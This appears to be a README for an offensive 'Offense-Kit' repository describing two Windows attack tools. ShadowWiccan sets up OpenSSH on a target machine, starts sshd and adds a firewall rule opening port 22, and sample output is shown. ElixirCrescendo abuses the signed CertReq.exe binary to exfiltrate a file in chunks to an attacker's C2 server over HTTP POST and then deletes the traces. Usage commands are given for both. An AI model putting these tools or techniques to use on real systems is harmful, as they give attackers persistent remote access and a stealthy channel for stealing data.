# Offense-Kit

## ShadowWiccan

An OpenSSH install wrapper for Windows. Download the [official Windows OpenSSH package](https://github.com/PowerShell/Win32-OpenSSH/releases) then move zip to target box or host on a web server. ShadowWiccan will create and work out of C:\ProgramData\ssh, get the ssh.zip, unzip, install, start needed services and add a firewall rule. You can get the SSH zip package from a UNC path(-f) or via web request(-w) and uninstall when you're done (-u). You'll need to have admin. Tested with OpehSSH version v8.1.0.0p1-Beta.

```
C:\>ShadowWiccan.exe -w "http://MyCoolSite/ssh.zip"
* * * * * * * * * * * * * * * * * * * * * * * * * *
      ╔═╗┬ ┬┌─┐┌┬┐┌─┐┬ ┬╦ ╦┬┌─┐┌─┐┌─┐┌┐┌
      ╚═╗├─┤├─┤ │││ ││││║║║││  │  ├─┤│││
      ╚═╝┴ ┴┴ ┴─┴┘└─┘└┴┘╚╩╝┴└─┘└─┘┴ ┴┘└┘
* * * An OpenSSH install wrapper for Windows * * *

[+] Downloading OpenSSH via HTTP
    http://127.0.0.1/ssh.zip

[+] OpenSSH payload written to:
    C:\ProgramData\ssh\ssh.zip
   [+] Unzipping and Installing
      [+] Install script found! Installing...
          _  _|\_
         | |  ("}
         >_<_.-@-._ _ /*  * S ^ *  H ~ *
          \--,  .-`*(/   * `  S +*  ^
          |  /==\
          |  |   \
          |  /___\
      [+] Done.

[+] Configuring OpenSSH
   [+] Service 'sshd' started successfully
   [+] Service 'ssh-agent' started successfully
   [+] Firewall rule 'WinOpenSSHD' added to allow port 22 in

[+] OpenSSH install and configuration COMPLETE
[+] Enjoy your accessh!
```


## ElixirCrescendo

Send a chunked file via a HTTP POST request using the built-in signed binary CertReq.exe. C# app will encode file, chunk into 63KB files (since certreq can only send less than 64KB per request), send each to specified C2 then delete the local chunked files. Just setup your C2 to write/log the content of incoming POST requests.

```
  *  *  * ElixirCrescendo *  *  *
             O*  .
               0   *
              .   o
             o   .
           _________
         c(`       ')o
           \.     ,/
          _//^---^\\_
  --CertReq.exe Exfil Wrapper--

Example:
    C:\>ElixirCrescendo.exe "C:\CoolFolder\juicy_file.zip"
```




